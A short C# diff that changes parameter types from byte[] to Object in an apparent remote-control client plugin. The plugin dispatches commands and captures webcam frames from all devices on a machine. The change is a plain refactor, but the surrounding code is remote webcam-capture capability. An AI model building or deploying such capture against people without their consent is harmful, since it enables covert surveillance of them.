@@ -16,13 +16,13 @@ namespace Pulsar.Plugin.UserCheck.Client
         private bool _isComplete = false;
         public bool IsComplete => _isComplete;
 
-        public void Initialize(byte[] initData)
+        public void Initialize(Object initData)
         {
             // Plugin loaded and ready
             // initData could contain default configuration if needed
         }
 
-        public PluginResult ExecuteCommand(string command, byte[] parameters)
+        public PluginResult ExecuteCommand(string command, Object parameters)
         {
             switch (command)
             {
@@ -39,7 +39,7 @@ namespace Pulsar.Plugin.UserCheck.Client
             }
         }
 
-        private PluginResult GetWebcamImage(byte[] parameters)
+        private PluginResult GetWebcamImage(Object parameters)
         {
             WebcamSnapshot snapshot = new WebcamSnapshot();
             var captureTask = snapshot.CaptureSingleFrameFromAllDevices();
